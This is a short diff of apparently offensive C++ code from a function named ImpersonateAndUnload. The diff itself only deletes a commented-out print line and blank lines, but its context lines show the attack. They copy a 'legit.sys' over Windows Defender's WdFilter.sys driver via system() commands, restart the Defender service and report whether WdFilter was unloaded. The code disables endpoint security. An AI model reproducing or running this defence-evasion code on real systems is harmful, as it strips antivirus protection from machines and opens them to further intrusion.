@@ -139,7 +139,6 @@ NTSTATUS ImpersonateAndUnload()
 	system("mkdir U:\\Windows\\System32\\Drivers\\wd\\");
 	std::cout << "[!] ";
 	system("copy .\\legit.sys U:\\Windows\\System32\\Drivers\\wd\\WdFilter.sys /Y");
-	//std::cout << "[!] ";
 	system("mountvol.exe U: /D");
 
 	success = StartServiceW(winDefendSvc.GetHandle(), 0, nullptr);
@@ -163,8 +162,6 @@ NTSTATUS ImpersonateAndUnload()
 		Error(RtlNtStatusToDosError(status));
 		std::cout << "[-] Failed to unload Wdfilter...\n";
 	}
-
-	
 #pragma endregion Wdfilter is unloaded
 	return status;
 }
